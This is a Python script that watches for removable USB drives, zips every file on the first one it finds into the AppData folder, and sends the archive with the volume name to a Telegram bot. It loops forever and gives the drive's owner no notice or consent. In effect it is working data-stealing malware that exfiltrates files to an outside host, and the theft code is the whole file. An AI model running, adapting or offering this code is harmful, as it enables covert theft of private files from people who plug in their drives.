import os
import zipfile
import subprocess
import hashlib
import requests

token = 'bot-token'
chat_id = 'chat-id'

def calculate_file_hash(file_path):
    hash_algo = hashlib.sha256()
    with open(file_path, 'rb') as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_algo.update(chunk)
    return hash_algo.hexdigest()

def get_volume_name(drive_letter):
    try:
        # WMIC command to get the volume name for a given drive letter
        cmd = f'wmic logicaldisk where "caption=\'{drive_letter}\'" get volumename'
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE).decode('utf-8')

        # Process the output
        lines = output.strip().split('\n')
        if len(lines) > 1 and lines[1].strip():
            return lines[1].strip()
        else:
            return 'No Name'
    except subprocess.CalledProcessError as e:
        print(f"Error executing WMIC command: {e}")
        return None

def scan_and_send(bot_token, chat_id):
    drives = []

    while not drives:
        cmd = 'wmic logicaldisk where "drivetype=2" get caption'
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE).decode('utf-8')
        drives = [drive.strip() for drive in output.split()[1:]]

    drive = drives[0]
    volume = get_volume_name(drive)
    
    # Define the path to the AppData folder
    appdata_folder = os.getenv('APPDATA')
    zip_file_name = os.path.join(appdata_folder, "files.zip")
    
    if os.path.exists(zip_file_name):
        old_hash = calculate_file_hash(zip_file_name)
    else:
        old_hash = 0

    with zipfile.ZipFile(zip_file_name, "w") as zip_file:
        for folder_name, subfolders, filenames in os.walk(drive):
            for filename in filenames:
                file_path = os.path.join(folder_name, filename)
                zip_file.write(file_path, arcname=os.path.relpath(file_path, drive))

    new_hash = calculate_file_hash(zip_file_name)

    if old_hash == new_hash:
        return

    message_text = f'**New Log**\nVolume Name: {volume}\nHash: {new_hash}'
    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
    files = {"document": open(zip_file_name, "rb")}
    data = {
        "chat_id": chat_id,
        "caption": message_text,
        "parse_mode": "Markdown"}

    response = requests.post(url, files=files, data=data)
    
    if response.status_code == 200:
        print("File successfully sent.")
    else:
        print("Error sending file.")
        print(response.text)

while True:
    try:
        scan_and_send(token, chat_id)
    except Exception as e:
        print(f"Error: {e}")